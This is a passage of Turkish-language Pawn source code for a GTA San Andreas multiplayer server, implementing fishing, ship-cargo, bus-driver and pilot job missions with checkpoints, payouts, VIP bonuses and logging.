	if(!IsInBalikOFIS(playerid)) return SendClientMessage(playerid, -1, "{FF0000}Balýk satýþ noktasýnda deðilsiniz!");

	new Ucret, Skor;

	for(new i; i < EldekiBalik[playerid]; i++)
	{
		Ucret += 800 + random(700);
	}

	if(VIP[playerid] >= 1 || YVIP[playerid] == 1)
	{
	    Ucret = Ucret * 3;
	    Skor = EldekiBalik[playerid] * 3;
	}else{
	    Skor = EldekiBalik[playerid];
	}

	new Yazi[300];
	format(Yazi, 300, "{FFCC00}» {FFFFFF}%d balýk {F8F8FF}satarak {ADFF2F}%d$, %d Skor ve 5 EXP {F8F8FF}kazandýnýz.", EldekiBalik[playerid], Ucret, Skor);
	SendClientMessage(playerid, -1, Yazi);
	
	EXP[playerid] = EXP[playerid] + 5;

	RewardPlayer(playerid, Ucret, Skor);

	EldekiBalik[playerid] = 0;
	return 1;
}

IsInBalikOFIS(playerid)
{
	new BalikciBaba37;

	for(new i; i < sizeof(BalikOFIS); i++)
	{
	    if(IsPlayerInRangeOfPoint(playerid, 5.0, BalikOFIS[i][LocX], BalikOFIS[i][LocY], BalikOFIS[i][LocZ]))
	    {
	        BalikciBaba37 = 1;
			break;
	    }
	}
	return BalikciBaba37;
}

Balikci_LoadMissionPlace()
{
	for(new a; a < sizeof(BalikOFIS); a++)
	{
	    CreateDynamic3DTextLabel("{FFCC00}» {FFFFFF}Balýk Satýþ Noktasý\n{F8F8FF}/baliksat", -1, BalikOFIS[a][LocX], BalikOFIS[a][LocY], BalikOFIS[a][LocZ], 70.0);
		CreateActor(34, BalikOFIS[a][LocX], BalikOFIS[a][LocY], BalikOFIS[a][LocZ], 270.0);
	}
}

Balikci_StartMission(playerid)
{
	if(EldekiBalik[playerid] == 20) return SendClientMessage(playerid, -1, "{FF0000}Sepetiniz balýk dolu. Balýklarýnýzý balýk satýþ noktalarýnda satýn!");
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, -1, "{FF0000}Bir balýkçý teknesine binmelisiniz!");
	new VehVeh = GetPlayerVehicleID(playerid);
	if(GetVehicleModel(VehVeh) != VehicleReefer) return SendClientMessage(playerid, -1, "{FF0000}Bir balýkçý teknesine binmelisiniz!");

	APlayerData[playerid][JobStarted] = true;
	APlayerData[playerid][VehicleID] = VehVeh;
	APlayerData[playerid][VehicleTimerTime] = Job_TimeToFailMission;

	BalikAsama[playerid] = 0;
	BalikAsamaM[playerid] = 60 + random(40);

	SendClientMessage(playerid, -1, "{00FF00}Balýk tutmaya baþladýnýz. Görevin iptal olmamasý için aracýnýzdan inmeyiniz.");
	SendClientMessage(playerid, -1, "{00FF00}Balýk tutmayý býrakmak için /goreviptal yazabilirsiniz.");
	SendClientMessage(playerid, -1, "{00FF00}Tuttuðunuz balýklarý balýk satýþ noktalarýnda /baliksat yazarak satabilirsiniz.");

	return 1;
}

Balikci_ControlMission(playerid)
{
	if(APlayerData[playerid][PlayerClass] != ClassBalikci) return 1;
	if(APlayerData[playerid][JobStarted] == false) return 1;

	new Yazi[300];

	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER)
	{
		APlayerData[playerid][VehicleTimerTime]--;
		BalikAsama[playerid] = 0;

		format(Yazi, 300, "~w~Teknenize Geri Donmeniz Icin~n~~r~%d Saniye", APlayerData[playerid][VehicleTimerTime]);
		GameTextForPlayer(playerid, Yazi, 1000, 3);

		if(APlayerData[playerid][VehicleTimerTime] == 0)
		{
		    SendClientMessage(playerid, -1, "{FF0000}60 saniye içinde teknenize geri dönmediðiniz için göreviniz iptal oldu.");
            Balikci_EndJob(playerid);
		}
		return 1;
	}

	if(GetPlayerVehicleID(playerid) != APlayerData[playerid][VehicleID])
	{
		APlayerData[playerid][VehicleTimerTime]--;
		BalikAsama[playerid] = 0;

		format(Yazi, 300, "~w~Teknenize Geri Donmeniz Icin~n~~r~%d Saniye", APlayerData[playerid][VehicleTimerTime]);
		GameTextForPlayer(playerid, Yazi, 1000, 3);

		if(APlayerData[playerid][VehicleTimerTime] == 0)
		{
		    SendClientMessage(playerid, -1, "{FF0000}60 saniye içinde teknenize geri dönmediðiniz için göreviniz iptal oldu.");
            Balikci_EndJob(playerid);
		}
		return 1;
	}

	BalikAsama[playerid]++;
	if(BalikAsama[playerid] == BalikAsamaM[playerid])
	{
		new Ihtimal = random(100), Cikan;
		if(Ihtimal < 5)
		{
			Cikan = random(sizeof(CopAdi));
			format(Yazi, 300, "{F8F8FF}Oltanýza {FF0000}%s {F8F8FF}geldi. Geri attýnýz...", CopAdi[Cikan]);
			SendClientMessage(playerid, -1, Yazi);
			SendClientMessage(playerid, -1, "{F8F8FF}Balýk tutmaya devam etmek için {ADFF2F}/work {F8F8FF}yazýnýz.");

			Balikci_EndJob(playerid);
		}else{
			Cikan = random(sizeof(BalikAdi));
			format(Yazi, 300, "{F8F8FF}Oltanýza {FF0000}%s {F8F8FF}geldi. Sepetinize attýnýz.", BalikAdi[Cikan]);
			SendClientMessage(playerid, -1, Yazi);

			APlayerData[playerid][StatsBalikciJobs]++;
			new Message[1024];
			format(Message, 1024, "Balýkçý görevini baþarýyla bitirdi");
			SqlLogYaz(playerid, 7, Message);
			EldekiBalik[playerid]++;

			SendClientMessage(playerid, -1, "{F8F8FF}Balýk tutmaya devam etmek için {ADFF2F}/work {F8F8FF}yazýnýz.");

			Balikci_EndJob(playerid);

			if(EldekiBalik[playerid] == 20)
			{
			    SendClientMessage(playerid, -1, "{00FF00}Sepetiniz doldu. Balýk satýþ noktalarýna gidin ve balýklarýnýzý satýn.");
			}
		}

		BalikAsama[playerid] = 0;
		BalikAsamaM[playerid] = 60 + random(40);
	}

	APlayerData[playerid][VehicleTimerTime] = Job_TimeToFailMission;
	return 1;
}

Balikci_EndJob(playerid)
{
	APlayerData[playerid][JobStarted] = false;
	APlayerData[playerid][VehicleID] = 0;

	SendClientMessage(playerid, -1, "{00FF00}Balýk tutmayý býraktýnýz. Balýk satýþ noktalarýnda tuttuðunuz balýklarý satabilirsiniz.");
	return 1;
}

// ************************************************************************************************************************************************************
// PPC_MissionsGemici
// ************************************************************************************************************************************************************
new GemiciMissionLoc[4][TLocation]={
{"Los Santos Liman", 2604.1665,-2672.3494,0.3410},
{"San Fierro Liman", -3113.2205,250.7435,0.3363},
{"Las Venturas Liman", 777.5810,588.5607,0.6078},
{"Porto Tugay", -3273.6892,2347.2671,0.8385}
};

new GemiciLoads[6][40]={
"Erzak",
"Icecek",
"Degerli Esya",
"Elektronik Esya",
"Icecek",
"Kargo"
};

Dialog_GemiciJobMethod(playerid, listitem, response)
{
	new DiaYazi[2000];
	if(response)
	{
		switch(listitem)
		{
		    case 0: // Kendi Görevini Seç
		    {
 				for(new i; i < sizeof(GemiciMissionLoc); i++)
		        {
					format(DiaYazi, 2000, "%s%s\n", DiaYazi, GemiciMissionLoc[i][LocationName]);
				}

				ShowPlayerDialog(playerid, DialogGemiciLoadLoc, DIALOG_STYLE_LIST, "Yukleme Yeri", DiaYazi, "Seç", "Geri");
		    }

		    case 1: // Rastgele Görev
			{
			    Gemici_StartRandomJob(playerid);
			}
		}
	}
	return 1;
}

Dialog_GemiciLoadLoc(playerid, listitem, response)
{
	if(response)
	{
		APlayerData[playerid][JobLoc1] = listitem;

		new DiaYazi[2000];

		for(new i; i < sizeof(GemiciMissionLoc); i++)
		{
			format(DiaYazi, 2000, "%s%s\n", DiaYazi, GemiciMissionLoc[i][LocationName]);
		}

		ShowPlayerDialog(playerid, DialogGemiciUnloadLoc, DIALOG_STYLE_LIST, "Boþaltma Yeri", DiaYazi, "Seç", "Geri");
	}
}

Dialog_GemiciUnloadLoc(playerid, listitem, response)
{
    new DiaYazi[2000];
	if(response)
	{
		if(APlayerData[playerid][JobLoc1] == listitem)
		{
		    SendClientMessage(playerid, -1, "{FF0000}Yükleme ve boþaltma yerleri ayný olamaz!");

			for(new i; i < sizeof(GemiciMissionLoc); i++)
			{
				format(DiaYazi, 2000, "%s%s\n", DiaYazi, GemiciMissionLoc[i][LocationName]);
			}

			ShowPlayerDialog(playerid, DialogGemiciUnloadLoc, DIALOG_STYLE_LIST, "Boþaltma Yeri", DiaYazi, "Seç", "Geri");
		    return 1;
		}

        new RanYuk = random(sizeof(GemiciLoads));

		APlayerData[playerid][JobLoc2] = listitem;

		APlayerData[playerid][LoadID] = RanYuk;
		APlayerData[playerid][JobStep] = 1;
		APlayerData[playerid][JobStarted] = true;

		APlayerData[playerid][VehicleID] = GetPlayerVehicleID(playerid);
		APlayerData[playerid][VehicleTimerTime] = Job_TimeToFailMission;

		SetPlayerCheckpoint(playerid, GemiciMissionLoc[ APlayerData[playerid][JobLoc1] ][LocX], GemiciMissionLoc[ APlayerData[playerid][JobLoc1] ][LocY], GemiciMissionLoc[ APlayerData[playerid][JobLoc1] ][LocZ], 6.0);

		new YazdirLo[256];
		format(YazdirLo, 256, "{F8F8FF}Yük almak için {FF0000}\"%s\"{F8F8FF}a sürün.", GemiciMissionLoc[ APlayerData[playerid][JobLoc1] ][LocationName]);
		SendClientMessage(playerid, -1, YazdirLo);

	}else{
		for(new i; i < sizeof(GemiciMissionLoc); i++)
		{
			format(DiaYazi, 2000, "%s%s\n", DiaYazi, GemiciMissionLoc[i][LocationName]);
		}

		ShowPlayerDialog(playerid, DialogGemiciLoadLoc, DIALOG_STYLE_LIST, "Yükleme Yeri", DiaYazi, "Seç", "Geri");
	}
	return 1;
}

Gemici_StartRandomJob(playerid)
{
	new Tirrek1 = random(sizeof(GemiciMissionLoc));
	new Tirrek2 = random(sizeof(GemiciMissionLoc));
	new RanYuk = random(sizeof(GemiciLoads));

	if(Tirrek1 == Tirrek2)
	{
	    Gemici_StartRandomJob(playerid);
	    return 1;
	}

	APlayerData[playerid][LoadID] = RanYuk;
	APlayerData[playerid][JobLoc1] = Tirrek1;
	APlayerData[playerid][JobLoc2] = Tirrek2;
	APlayerData[playerid][JobStep] = 1;
	APlayerData[playerid][JobStarted] = true;

	APlayerData[playerid][VehicleID] = GetPlayerVehicleID(playerid);
	APlayerData[playerid][VehicleTimerTime] = Job_TimeToFailMission;

	SetPlayerCheckpoint(playerid, GemiciMissionLoc[ APlayerData[playerid][JobLoc1] ][LocX], GemiciMissionLoc[ APlayerData[playerid][JobLoc1] ][LocY], GemiciMissionLoc[ APlayerData[playerid][JobLoc1] ][LocZ], 6.0);

	new YazdirLo[256];
	format(YazdirLo, 256, "{F8F8FF}Yük almak için {FF0000}\"%s\"{F8F8FF}a sürün.", GemiciMissionLoc[ APlayerData[playerid][JobLoc1] ][LocationName]);
	SendClientMessage(playerid, -1, YazdirLo);
	return 1;
}

Gemici_EnterCheckpoint(playerid)
{
	if(APlayerData[playerid][JobStarted] == false) return 1;
	if(APlayerData[playerid][VehicleTimerTime] < Job_TimeToFailMission) return SendClientMessage(playerid, -1, "{FF0000}Lütfen buraya göreve baþladýðýnýz tekneyle geliniz.");

	switch(APlayerData[playerid][JobStep])
	{
	    case 1: // Yükle
	    {
	        DisablePlayerCheckpoint(playerid);
	        APlayerData[playerid][JobStep] = 2;

	        GameTextForPlayer(playerid, "~w~Tekne Yukleniyor...", 5000, 5);
	        BusBekletLo(playerid);

        	SetPlayerCheckpoint(playerid, GemiciMissionLoc[ APlayerData[playerid][JobLoc2] ][LocX], GemiciMissionLoc[ APlayerData[playerid][JobLoc2] ][LocY], GemiciMissionLoc[ APlayerData[playerid][JobLoc2] ][LocZ], 6.0);

			new YazdirLo[256];
			format(YazdirLo, 256, "{F8F8FF}Þimdi yükleri {FF0000}\"%s\"{F8F8FF}a götürünüz.", GemiciMissionLoc[ APlayerData[playerid][JobLoc2] ][LocationName]);
			SendClientMessage(playerid, -1, YazdirLo);
	    }

		case 2: // Boþalt
		{
	        DisablePlayerCheckpoint(playerid);
	        APlayerData[playerid][JobStep] = 0;
            APlayerData[playerid][JobStarted] = false;

	        GameTextForPlayer(playerid, "~w~Tekne Bosaltiliyor...", 5000, 5);
	        BusBekletLo(playerid);

	        new Float:XFs, Float:YFs, Float:ZFs;
			new Float:Mesafes, Ucrets, Skor;
	        XFs = GemiciMissionLoc[ APlayerData[playerid][JobLoc2] ][LocX] - GemiciMissionLoc[ APlayerData[playerid][JobLoc1] ][LocX];
	        YFs = GemiciMissionLoc[ APlayerData[playerid][JobLoc2] ][LocY] - GemiciMissionLoc[ APlayerData[playerid][JobLoc1] ][LocY];
  	        ZFs = GemiciMissionLoc[ APlayerData[playerid][JobLoc2] ][LocZ] - GemiciMissionLoc[ APlayerData[playerid][JobLoc1] ][LocZ];
			Mesafes = floatsqroot(XFs*XFs + YFs*YFs + ZFs*ZFs);
			Ucrets = floatround(Mesafes * 10.0);
			if(Mesafes > 3000.0) { Skor = 5; } else { Skor = 3; }

			new GorevSonuc[2000];
			format(GorevSonuc, 2000, "{80FFFF}==========[{F8F8FF}GÖREV TAMAMLANDI{80FFFF}]==========");
			format(GorevSonuc, 2000, "%s\n \n{F8F8FF}Mesafe:      {ADFF2F}%dm", GorevSonuc, floatround(Mesafes));
			if(VIP[playerid] == 1 || YVIP[playerid] == 1)
			{
				format(GorevSonuc, 2000, "%s\n{F8F8FF}VIP Bonusu:     {ADFF2F}%d$ ve %d Skor", GorevSonuc, Ucrets*2, Skor*2);
 				Ucrets += 2*Ucrets;
 				Skor += 2*Skor;
			}
			format(GorevSonuc, 2000, "%s\n{F8F8FF}Kazancýnýz:  {ADFF2F}%d$, %d Skor ve 5 EXP", GorevSonuc, Ucrets, Skor);
			format(GorevSonuc, 2000, "%s\n \n{80FFFF}======================================", GorevSonuc);
			ShowPlayerDialog(playerid, 9999, DIALOG_STYLE_MSGBOX, "{80FFFF}Gemicilik Görevi", GorevSonuc, "Kapat", "");

			RewardPlayer(playerid, Ucrets, Skor);
			APlayerData[playerid][StatsGemiciJobs]++;
			new Message[1024];
			format(Message, 1024, "Gemici görevini baþarýyla bitirdi");
			SqlLogYaz(playerid, 7, Message);
			
			EXP[playerid] = EXP[playerid] + 5;
			
			if(APlayerData[playerid][StatsGemiciJobs] >= 11)
			{
				GivePlayerAchievement(playerid, GemiciAch, 1); // Baþarým Sistemi
			}
		}
	}
	return 1;
}

Gemici_ControlMission(playerid)
{
	if(APlayerData[playerid][PlayerClass] != ClassGemici) return 1;
	if(APlayerData[playerid][JobStarted] == false) return 1;

	new CakLa[80];

	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER)
	{
	    APlayerData[playerid][VehicleTimerTime]--;

		if(APlayerData[playerid][VehicleTimerTime] == 0)
		{
		    Gemici_EndJob(playerid);
			SendClientMessage(playerid, -1, "{FF0000}60 saniye içinde teknenize geri dönmediðiniz için göreviniz iptal oldu.");
			SendClientMessage(playerid, -1, "{FF0000}Hesabýnýzdan 1000$ kesildi.");
			RewardPlayer(playerid, -1000, 0);
		}else{
		    format(CakLa, 80, "~r~%d Saniye Icinde~n~Teknene Geri Don", APlayerData[playerid][VehicleTimerTime]);
		    GameTextForPlayer(playerid, CakLa, 1000, 5);
		}

	    return 1;
	}

	if(GetPlayerVehicleID(playerid) != APlayerData[playerid][VehicleID])
	{
	    APlayerData[playerid][VehicleTimerTime]--;

		if(APlayerData[playerid][VehicleTimerTime] == 0)
		{
		    Gemici_EndJob(playerid);
			SendClientMessage(playerid, -1, "{FF0000}60 saniye içinde teknenize geri dönmediðiniz için göreviniz iptal oldu.");
			SendClientMessage(playerid, -1, "{FF0000}Hesabýnýzdan 1000$ kesildi.");
			RewardPlayer(playerid, -1000, 0);
		}else{
		    format(CakLa, 80, "~r~%d Saniye Icinde~n~Teknene Geri Don", APlayerData[playerid][VehicleTimerTime]);
		    GameTextForPlayer(playerid, CakLa, 1000, 5);
		}

	    return 1;
	}

	APlayerData[playerid][VehicleTimerTime] = Job_TimeToFailMission;

	return 1;
}

Gemici_EndJob(playerid)
{
	APlayerData[playerid][JobStarted] = false;
	DisablePlayerCheckpoint(playerid);
	return 1;
}


// ************************************************************************************************************************************************************
// PPC_MissionsBus
// ************************************************************************************************************************************************************
new BusDriverMissionLoc[10][TLocation]={
{"Los Santos Otogar", 1778.50, -1906.09,   13.38},
{"San Fierro Otogar", -1714.13, -102.42,    3.55},
{"Las Venturas Otogar", 1490.98,  721.83,   10.39},
{"Tugis Otobus Duragi", 3876.3486,569.5827,10.9866},
/*{"Anadolu Island Otogar", -4371.3887,-1289.9647,11.0477},*/
{"Emkatu Otogar", -1172.84, 3762.56,  104.75},
{"Antalya Otogar", -926.7308,-4379.5981,84.9917},
{"Konya Otogar", 3678.3040,-3787.7090,11.8687},
{"Ankara Otogar", -4111.11, -602.56,   20.63},
{"Duzce Otogar", -4306.29, -112.66,   47.63},
{"Longway Otogar", -6838.37, -7117.79,   27.08}
};

Dialog_BusJobMethod(playerid, listitem, response)
{
	new DiaYazi[2000];
	if(response)
	{
		switch(listitem)
		{
		    case 0: // Kendi Görevini Seç
		    {
 				for(new i; i < sizeof(BusDriverMissionLoc); i++)
		        {
					format(DiaYazi, 2000, "%s%s\n", DiaYazi, BusDriverMissionLoc[i][LocationName]);
				}

				ShowPlayerDialog(playerid, DialogBusDriverLoadLoc, DIALOG_STYLE_LIST, "Yolcu Bindirme Yeri", DiaYazi, "Seç", "Geri");
		    }

		    case 1: // Rastgele Görev
			{
			    BusDriver_StartRandomJob(playerid);
			}
		}
	}
	return 1;
}

Dialog_BusDriverLoadLoc(playerid, listitem, response)
{
		if(response)
		{
			APlayerData[playerid][JobLoc1] = listitem;

			new DiaYazi[2000];

			for(new i; i < sizeof(BusDriverMissionLoc); i++)
			{
				format(DiaYazi, 2000, "%s%s\n", DiaYazi, BusDriverMissionLoc[i][LocationName]);
			}

			ShowPlayerDialog(playerid, DialogBusDriverUnloadLoc, DIALOG_STYLE_LIST, "Yolcu Ýndirme Yeri", DiaYazi, "Seç", "Geri");
		}

}

Dialog_BusDriverUnloadLoc(playerid, listitem, response)
{
    new DiaYazi[2000];
	if(response)
	{
		if(APlayerData[playerid][JobLoc1] == listitem)
		{
		    SendClientMessage(playerid, -1, "{FF0000}Yolcu indirme ve bindirme yerleri ayný olamaz!");

			for(new i; i < sizeof(BusDriverMissionLoc); i++)
			{
				format(DiaYazi, 2000, "%s%s\n", DiaYazi, BusDriverMissionLoc[i][LocationName]);
			}

			ShowPlayerDialog(playerid, DialogBusDriverUnloadLoc, DIALOG_STYLE_LIST, "Yolcu Ýndirme Yeri", DiaYazi, "Seç", "Geri");
		    return 1;
		}

		APlayerData[playerid][JobLoc2] = listitem;

		APlayerData[playerid][JobStep] = 1;
		APlayerData[playerid][JobStarted] = true;

		APlayerData[playerid][VehicleID] = GetPlayerVehicleID(playerid);
		APlayerData[playerid][VehicleTimerTime] = Job_TimeToFailMission;

		SetPlayerCheckpoint(playerid, BusDriverMissionLoc[ APlayerData[playerid][JobLoc1] ][LocX], BusDriverMissionLoc[ APlayerData[playerid][JobLoc1] ][LocY], BusDriverMissionLoc[ APlayerData[playerid][JobLoc1] ][LocZ], 6.0);

		new YazdirLo[256];
		format(YazdirLo, 256, "{F8F8FF}Yolcularý almak için {FF0000}\"%s\"{F8F8FF}a sürün.", BusDriverMissionLoc[ APlayerData[playerid][JobLoc1] ][LocationName]);
		SendClientMessage(playerid, -1, YazdirLo);
	}else{
		for(new i; i < sizeof(BusDriverMissionLoc); i++)
		{
			format(DiaYazi, 2000, "%s%s\n", DiaYazi, BusDriverMissionLoc[i][LocationName]);
		}

		ShowPlayerDialog(playerid, DialogBusDriverLoadLoc, DIALOG_STYLE_LIST, "Yolcu Bindirme Yeri", DiaYazi, "Seç", "Geri");
	}
	return 1;
}

BusDriver_StartRandomJob(playerid)
{
	new Tirrek1 = random(sizeof(BusDriverMissionLoc));
	new Tirrek2 = random(sizeof(BusDriverMissionLoc));

	if(Tirrek1 == Tirrek2)
	{
	    BusDriver_StartRandomJob(playerid);
	    return 1;
	}

	APlayerData[playerid][JobLoc1] = Tirrek1;
	APlayerData[playerid][JobLoc2] = Tirrek2;
	APlayerData[playerid][JobStep] = 1;
	APlayerData[playerid][JobStarted] = true;

	APlayerData[playerid][VehicleID] = GetPlayerVehicleID(playerid);
	APlayerData[playerid][VehicleTimerTime] = Job_TimeToFailMission;

	SetPlayerCheckpoint(playerid, BusDriverMissionLoc[ APlayerData[playerid][JobLoc1] ][LocX], BusDriverMissionLoc[ APlayerData[playerid][JobLoc1] ][LocY], BusDriverMissionLoc[ APlayerData[playerid][JobLoc1] ][LocZ], 6.0);

	new YazdirLo[256];
	format(YazdirLo, 256, "{F8F8FF}Yolcularý almak için {FF0000}\"%s\"{F8F8FF}a sürün.", BusDriverMissionLoc[ APlayerData[playerid][JobLoc1] ][LocationName]);
	SendClientMessage(playerid, -1, YazdirLo);
	return 1;
}

BusDriver_EnterCheckpoint(playerid)
{
    if(APlayerData[playerid][JobStarted] == false) return 1;
	if(APlayerData[playerid][VehicleTimerTime] < Job_TimeToFailMission) return SendClientMessage(playerid, -1, "{FF0000}Lütfen buraya göreve baþladýðýnýz otobüsle geliniz.");

     	// Check if the player is inside a convoy
	if (APlayerData[playerid][InConvoy] == true)
	{
		// If the player just loaded his goods at the loading-point
	    if (APlayerData[playerid][JobStep] == 1)
		{
	        APlayerData[playerid][JobStep] = 2; // Set the next step of the convoy-job (wait until all members have loaded their cargo)
			//TextDrawSetString(APlayerData[playerid][MissionText], TXT_WaitingMembersToLoadCargo);
		}

		// If the player just delivered his goods at the unloading-point
		if (APlayerData[playerid][JobStep] == 3)
		{
	        APlayerData[playerid][JobStep] = 4; // Set the next step of the convoy-job (wait until all members have unloaded their cargo)
	    	//TextDrawSetString(APlayerData[playerid][MissionText], TXT_WaitingMembersToUnLoadCargo);
		}

		DisablePlayerCheckpoint(playerid); // Delete the loading/unloading-checkpoint
		TogglePlayerControllable(playerid, 1); // Enable the player again (he can move again)

		return 1; // Don't allow the rest of the function to be executed
	}

	switch(APlayerData[playerid][JobStep])
	{
	    case 1: // Yükle
	    {
	        DisablePlayerCheckpoint(playerid);
	        APlayerData[playerid][JobStep] = 2;

	        GameTextForPlayer(playerid, "~w~Yolcular Otobuse Biniyor...", 5000, 5);
	        BusBekletLo(playerid);

        	SetPlayerCheckpoint(playerid, BusDriverMissionLoc[ APlayerData[playerid][JobLoc2] ][LocX], BusDriverMissionLoc[ APlayerData[playerid][JobLoc2] ][LocY], BusDriverMissionLoc[ APlayerData[playerid][JobLoc2] ][LocZ], 6.0);

			new YazdirLo[256];
			format(YazdirLo, 256, "{F8F8FF}Þimdi yolcularý {FF0000}\"%s\"{F8F8FF}a götürünüz.", BusDriverMissionLoc[ APlayerData[playerid][JobLoc2] ][LocationName]);
			SendClientMessage(playerid, -1, YazdirLo);
	    }

		case 2: // Boþalt
		{
	        DisablePlayerCheckpoint(playerid);
	        APlayerData[playerid][JobStep] = 0;
            APlayerData[playerid][JobStarted] = false;

	        GameTextForPlayer(playerid, "~w~Yolcular Otobusten Iniyor...", 5000, 5);
	        BusBekletLo(playerid);

	        new Float:XFf, Float:YFf, Float:ZFf;
			new Float:Mesafef, Ucret, Skor;
	        XFf = BusDriverMissionLoc[ APlayerData[playerid][JobLoc2] ][LocX] - BusDriverMissionLoc[ APlayerData[playerid][JobLoc1] ][LocX];
	        YFf = BusDriverMissionLoc[ APlayerData[playerid][JobLoc2] ][LocY] - BusDriverMissionLoc[ APlayerData[playerid][JobLoc1] ][LocY];
  	        ZFf = BusDriverMissionLoc[ APlayerData[playerid][JobLoc2] ][LocZ] - BusDriverMissionLoc[ APlayerData[playerid][JobLoc1] ][LocZ];
			Mesafef = floatsqroot(XFf*XFf + YFf*YFf + ZFf*ZFf);
			Ucret = floatround(Mesafef * 4.0);
			if(Mesafef > 3000.0) { Skor = 3; } else { Skor = 2; }

			new GorevSonuc[2000];
			format(GorevSonuc, 2000, "{80FFFF}==========[{F8F8FF}GÖREV TAMAMLANDI{80FFFF}]==========");
			format(GorevSonuc, 2000, "%s\n \n{F8F8FF}Mesafe:      {ADFF2F}%dm", GorevSonuc, floatround(Mesafef));

			if(VIP[playerid] == 1 || YVIP[playerid] == 1)
			{
				format(GorevSonuc, 2000, "%s\n{F8F8FF}VIP Bonusu:  {ADFF2F}%d$ ve %d Skor", GorevSonuc, Ucret*2, Skor*2);
 				Ucret += 2*Ucret;
				Skor += 2*Skor;
			}

			format(GorevSonuc, 2000, "%s\n{F8F8FF}Kazancýnýz:  {ADFF2F}%d$ ve %d Skor", GorevSonuc, Ucret, Skor);
			format(GorevSonuc, 2000, "%s\n \n{80FFFF}======================================", GorevSonuc);
			ShowPlayerDialog(playerid, 9999, DIALOG_STYLE_MSGBOX, "{80FFFF}Otobüsçülük Görevi", GorevSonuc, "Kapat", "");

			RewardPlayer(playerid, Ucret, Skor);
			APlayerData[playerid][StatsBusDriverJobs]++;
			new LogYazi[1024];
			format(LogYazi, 1024, "Otobüs görevini baþarýyla bitirdi");
    		SqlLogYaz(playerid, 7, LogYazi);
			if(APlayerData[playerid][StatsBusDriverJobs] >= 15)
			{
			  GivePlayerAchievement(playerid, OtobuscuAch, 1); // Baþarým Sistemi
			}
			format(LogYazi, 350, "[OTOBUSCU] %s, %s'den %s'e %s tasidi. Kazanc: %d$ ve %d Skor Sure: %d Saniye", GetName(playerid), BusDriverMissionLoc[APlayerData[playerid][JobLoc1]][LocationName], BusDriverMissionLoc[APlayerData[playerid][JobLoc2]][LocationName], "Yolcu", Ucret, Skor, GorevTime[playerid]);
			LOG(LogYazi);
		}
	}
	return 1;
}

BusDriver_ControlMission(playerid)
{
	if(APlayerData[playerid][PlayerClass] != ClassBusDriver) return 1;
	if(APlayerData[playerid][JobStarted] == false) return 1;

	new CakLa[80];

	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER)
	{
	    APlayerData[playerid][VehicleTimerTime]--;

		if(APlayerData[playerid][VehicleTimerTime] == 0)
		{
		    BusDriver_EndJob(playerid);
			SendClientMessage(playerid, -1, "{FF0000}60 saniye içinde otobüsünüze geri dönmediðiniz için göreviniz iptal oldu.");
			SendClientMessage(playerid, -1, "{FF0000}Hesabýnýzdan 1000$ kesildi.");
			RewardPlayer(playerid, -1000, 0);
		}else{
		    format(CakLa, 80, "~r~%d Saniye Icinde~n~Otobusune Geri Don", APlayerData[playerid][VehicleTimerTime]);
		    GameTextForPlayer(playerid, CakLa, 1000, 5);
		}

	    return 1;
	}

	if(GetPlayerVehicleID(playerid) != APlayerData[playerid][VehicleID])
	{
	    APlayerData[playerid][VehicleTimerTime]--;

		if(APlayerData[playerid][VehicleTimerTime] == 0)
		{
		    BusDriver_EndJob(playerid);
			SendClientMessage(playerid, -1, "{FF0000}60 saniye içinde otobüsünüze geri dönmediðiniz için göreviniz iptal oldu.");
			SendClientMessage(playerid, -1, "{FF0000}Hesabýnýzdan 1000$ kesildi.");
			RewardPlayer(playerid, -1000, 0);
		}else{
		    format(CakLa, 80, "~r~%d Saniye Icinde~n~Otobusune Geri Don", APlayerData[playerid][VehicleTimerTime]);
		    GameTextForPlayer(playerid, CakLa, 1000, 5);
		}

	    return 1;
	}

	APlayerData[playerid][VehicleTimerTime] = Job_TimeToFailMission;

	return 1;
}

BusDriver_EndJob(playerid)
{
	APlayerData[playerid][JobStarted] = false;
	DisablePlayerCheckpoint(playerid);
	return 1;
}

BusBekletLo(playerid)
{
	TogglePlayerControllable(playerid, 0);
	SetTimerEx("BusYeterLo", 5000, false, "i", playerid);
}

forward BusYeterLo(playerid);
public BusYeterLo(playerid)
{
	TogglePlayerControllable(playerid, 1);
}
// ************************************************************************************************************************************************************
// PPC_MissionsPilot
// ************************************************************************************************************************************************************

// Forward the public function used as a timer to load/unload your vehicle
forward Pilot_Plane_LoadUnload(playerid);



// This function is called when a pilot wants to start a job by entering "/work"
Pilot_StartRandomJob(playerid)
{
	// Setup local variables
	new PilotJobSet;

	// Check the vehicle-model of the player to decide which job the player can get
	switch (GetVehicleModel(GetPlayerVehicleID(playerid)))
	{
		case VehicleShamal, VehicleNevada: // Select a random job for planes
			PilotJobSet = Pilot_Plane_SetRandomJob(playerid);
		case VehicleMaverick, VehicleCargobob: // Select a random job for helicopters
		    PilotJobSet = Pilot_Heli_SetRandomJob(playerid);
	}

	// Check if a job was set correctly
	switch (PilotJobSet)
	{
		case 1, 2:
		{
		    // Setup local variables
			new StartLoc[50], EndLoc[50], Load[50], Float:x, Float:y, Float:z, LoadMsg[128];

			// Job has started
			APlayerData[playerid][JobStarted] = true;

			// Set jobstep to 1 (going to load the goods)
			APlayerData[playerid][JobStep] = 1;
			// Get the startlocation, endlocation and the load texts
			format(StartLoc, 50, ALocations[APlayerData[playerid][JobLoc1]][LocationName]);
			format(EndLoc, 50, ALocations[APlayerData[playerid][JobLoc2]][LocationName]);
			format(Load, 50, ALoads[APlayerData[playerid][LoadID]][LoadName]);
			// Grab the x, y, z positions for the first location
			x = ALocations[APlayerData[playerid][JobLoc1]][LocX];
			y = ALocations[APlayerData[playerid][JobLoc1]][LocY];
			z = ALocations[APlayerData[playerid][JobLoc1]][LocZ];
			// Create a checkpoint where the player should load the goods
			SetPlayerCheckpoint(playerid, x, y, z, 7);
			// Inform the player that he must load his goods
			format(LoadMsg, 128, TXT_PickupCargoAt, Load, StartLoc);
			SendClientMessage(playerid, 0xFFFFFFFF, LoadMsg);
		}
	}

	return 1;
}

// This function sets a random job for a plane vehicle and returns 1 if a job has been set
// The function returns 0 if a job couldn't be set (if the player is driving an invalid vehicle to start piloting-jobs)
Pilot_Plane_SetRandomJob(playerid)
{
	// If the player is the driver of the vehicle (GetPlayerVehicleSeat returns -1 if the player is not in a vehicle)
	if (GetPlayerVehicleSeat(playerid) == 0)
	{
		// Check the vehicle-model of the player to decide which job the player can get
